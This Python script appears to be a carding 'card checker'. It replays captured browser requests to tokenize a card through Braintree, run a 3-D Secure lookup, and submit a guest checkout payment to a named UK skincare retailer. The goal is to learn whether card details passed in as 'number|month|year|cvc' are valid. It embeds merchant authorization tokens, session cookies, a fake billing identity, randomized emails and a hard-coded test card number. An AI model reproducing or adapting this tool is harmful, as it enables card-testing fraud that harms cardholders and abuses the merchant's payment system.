from api.parentchecker import ParentChecker
import random
import json



URL1 = "https://payments.braintree-api.com/graphql"

HEADERS1 = """Host: payments.braintree-api.com
Connection: keep-alive
Content-Length: 733
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2NDE3MDA3MTMsImp0aSI6ImZlMGU5NDFlLTk1NWItNGViYy05MzRmLTM5ZmNhNWIwNDE1OSIsInN1YiI6IjRtM21oNzI1NWQ3eHJzN2oiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjRtM21oNzI1NWQ3eHJzN2oiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImRlcm1hY2FyZWRpcmVjdEdCUCJ9fQ.ecnQr3XK0rNeQwcb81d-HLw0FiNghSlDDbIGZlX7cX7NX0IwtK3sqzWxG-E1YdQthvq2uVcFcAf9IVO6ok-bhQ
Content-Type: application/json
sec-ch-ua-mobile: ?1
User-Agent: Mozilla/5.0 (Linux; Android 12; Phone 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.92 Mobile Safari/537.36
Braintree-Version: 2018-05-10
sec-ch-ua-platform: "Android"
Accept: */*
Origin: https://assets.braintreegateway.com
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://assets.braintreegateway.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-US,es;q=0.9
"""

# format: ccn, month year, cvc
POSTDATA1 = """{{"clientSdkMetadata":{{"source":"client","integration":"custom","sessionId":"a789396e-0013-4ef4-ad97-267c2143ff9e"}},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {{   tokenizeCreditCard(input: $input) {{     token     creditCard {{       bin       brandCode       last4       expirationMonth      expirationYear      binData {{         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }}     }}   }} }}","variables":{{"input":{{"creditCard":{{"number":"{ccn}","expirationMonth":"{month}","expirationYear":"{year}","cvv":"{cvc}"}},"options":{{"validate":false}}}}}},"operationName":"TokenizeCreditCard"}}"""

# format: token
URL2 = "https://api.braintreegateway.com/merchants/4m3mh7255d7xrs7j/client_api/v1/payment_methods/{token}/three_d_secure/lookup"


HEADERS2 = """Host: api.braintreegateway.com
Connection: keep-alive
Content-Length: 1360
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"
sec-ch-ua-mobile: ?1
User-Agent: Mozilla/5.0 (Linux; Android 12; Phone 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.92 Mobile Safari/537.36
sec-ch-ua-platform: "Android"
Content-Type: application/json
Accept: */*
Origin: https://www.dermacaredirect.co.uk
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.dermacaredirect.co.uk/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-US,es;q=0.9
"""

POSTDATA2 = """{"amount":19.45,"additionalInfo":{"billingLine1":"39 Judith Pl","billingCity":"East Islip","billingState":"New York","billingPostalCode":"11730","billingCountryCode":"US","billingPhoneNumber":"","billingGivenName":"Ross","billingSurname":"Geller"},"dfReferenceId":"0_ae4e3bdb-1d4a-442a-9e7c-1adf2b5d2e7b","clientMetadata":{"sdkVersion":"web/3.51.0","requestedThreeDSecureVersion":"2","cardinalDeviceDataCollectionTimeElapsed":55},"authorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2NDE3MTg0NTIsImp0aSI6ImZhMzlhZmRiLTRjOWMtNGRhMi1iMmM0LWE2NjEwNzFjODIxNSIsInN1YiI6IjRtM21oNzI1NWQ3eHJzN2oiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjRtM21oNzI1NWQ3eHJzN2oiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImRlcm1hY2FyZWRpcmVjdEdCUCJ9fQ.MhKCrBKqvAeniYsPm_OW6OeseJ-3NkRaS42nYUdgovqoNWyxrWCpfs5WaIf8PxPlebpdea32lQ0buO8rVDclvA","braintreeLibraryVersion":"braintree/web/3.51.0","_meta":{"merchantAppId":"www.dermacaredirect.co.uk","platform":"web","sdkVersion":"3.51.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"3c458ece-5de1-4783-9fc3-fd88bf9c0cee"}}"""


URL3 = "https://www.dermacaredirect.co.uk/rest/default/V1/guest-carts/mU604gp2VpHuLnKrhvtaC1icY6RUBhZh/payment-information"

HEADERS3 = """Host: www.dermacaredirect.co.uk
content-length: 631
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"
accept: */*
content-type: application/json
x-requested-with: XMLHttpRequest
sec-ch-ua-mobile: ?1
user-agent: Mozilla/5.0 (Linux; Android 12; Phone 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.92 Mobile Safari/537.36
sec-ch-ua-platform: "Android"
origin: https://www.dermacaredirect.co.uk
sec-fetch-site: same-origin
sec-fetch-mode: cors
sec-fetch-dest: empty
referer: https://www.dermacaredirect.co.uk/checkout/
accept-encoding: gzip, deflate, br
accept-language: es-US,es;q=0.9"""

COOKIES3 = """cookie: amzn-checkout-session=%7B%7D
cookie: mage-cache-storage=%7B%7D
cookie: mage-cache-storage-section-invalidation=%7B%7D
cookie: form_key=Gv7u6LjkINGuNnxb
cookie: PHPSESSID=67kesr5crum6iu88tm491ddc26
cookie: wp_customerGroup=NOT+LOGGED+IN
cookie: X-Magento-Vary=e3cb9ab3566a693edff3edf82caa39b1ed79e8ba
cookie: recently_viewed_product=%7B%7D
cookie: recently_viewed_product_previous=%7B%7D
cookie: recently_compared_product=%7B%7D
cookie: recently_compared_product_previous=%7B%7D
cookie: product_data_storage=%7B%7D
cookie: form_key=Gv7u6LjkINGuNnxb
cookie: __zlcmid=17wkcBQzB7N1OxO
cookie: amzn-checkout-session-config=%7B%7D
cookie: language=en_GB
cookie: ledgerCurrency=GBP
cookie: apay-session-set=GIn1dn19y4ofVsFu2nV%2BrQga%2ByCRj9lpDtc%2BGY11Ar%2F1teYAEhjeNAA0rEFX%2BNQ%3D
cookie: mage-cache-sessid=true
cookie: mage-messages=
cookie: private_content_version=b6e7203ab7e134a999baac69ef219a1b
cookie: __kla_id=eyIkcmVmZXJyZXIiOnsidHMiOjE2NDE2MzE1NjUsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmRlcm1hY2FyZWRpcmVjdC5jby51ay8ifSwiJGxhc3RfcmVmZXJyZXIiOnsidHMiOjE2NDE2MzIwNTYsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmRlcm1hY2FyZWRpcmVjdC5jby51ay8ifX0=
cookie: sociallogin_referer_store=https%3A%2F%2Fwww.dermacaredirect.co.uk%2Fcheckout%2F%23payment
cookie: section_data_ids=%7B%22gtm%22%3A1641632059%2C%22messages%22%3A1641632067%2C%22customer%22%3A1641631628%2C%22compare-products%22%3A1641631628%2C%22last-ordered-items%22%3A1641631628%2C%22cart%22%3A1641631886%2C%22directory-data%22%3A1641631628%2C%22captcha%22%3A1641631628%2C%22instant-purchase%22%3A1641631628%2C%22loggedAsCustomer%22%3A1641631628%2C%22persistent%22%3A1641631628%2C%22review%22%3A1641631628%2C%22wishlist%22%3A1641631628%2C%22ammessages%22%3A1641631886%2C%22recently_viewed_product%22%3A1641631628%2C%22recently_compared_product%22%3A1641631628%2C%22product_data_storage%22%3A1641631628%2C%22paypal-billing-agreement%22%3A1641631628%7D"""


# format: randomnumber for email
POSTDATA3 = '{{"cartId":"mU604gp2VpHuLnKrhvtaC1icY6RUBhZh","billingAddress":{{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["39 Judith Pl"],"company":"Tesla Pvt.","telephone":"","postcode":"11730","city":"East Islip","firstname":"Ross","lastname":"Geller","customAttributes":[{{"attribute_code":"kl_email_consent","value":""}}],"saveInAddressBook":null}},"paymentMethod":{{"method":"braintree","additional_data":{{"payment_method_nonce":"c29efe46-c49d-1390-a194-d3f880ef5831","device_data":"{{"device_session_id":"fee11eea793c3bc3fb51d16759e71355","fraud_merchant_id":null}}"}}}},"email":"rossg{}@gmail.com"}}'


class Check(ParentChecker):
    """arg: Only the card details separated by |"""
    def __init__(self, card):
        super().__init__(card)

    def request_1(self):
        url = URL1
        headers = super().format_headers(HEADERS1)
        postdata = POSTDATA1.format(ccn= self.ccn, month= self.month, year= self.year, cvc = self.cvc)
        res = self.session.post(url= url, headers= headers, data= postdata)
        res_json = json.loads(res.text)
        try:
            self.token = res_json["data"]["tokenizeCreditCard"]["token"]
            return self.token
        except KeyError:
            return "Error : " + str(res.text)


    def request_2(self):
        url = URL2.format(token= self.token)
        headers = super().format_headers(HEADERS2)
        postdata = POSTDATA2
        res = self.session.post(url= url, headers= headers, data= postdata)
        print(res.status_code)
        res_json = json.loads(res.text)
        try:
            nonce = res_json["paymentMethod"]["nonce"]
            return nonce
        except:
            return "Error : " + str(res.text)

    def request_3(self):
        url = URL3
        headers = super().format_headers(HEADERS3)
        postdata = POSTDATA3.format(random.randint(11111, 999999))
        super().add_cookies(COOKIES3)
        res = self.session.post(url= url, headers= headers, data= postdata)
        print(res.text)
        res_json = json.loads(res.text)
        try:
            return res_json["message"]
        except KeyError:
            return "Error:" + str(res.text)



def test():
    checker = Check("4741745101613137|02|2025|024")
    print(checker.request_1())
    print(checker.request_2())
    print(checker.request_3())




if __name__=="__main__":
    test()

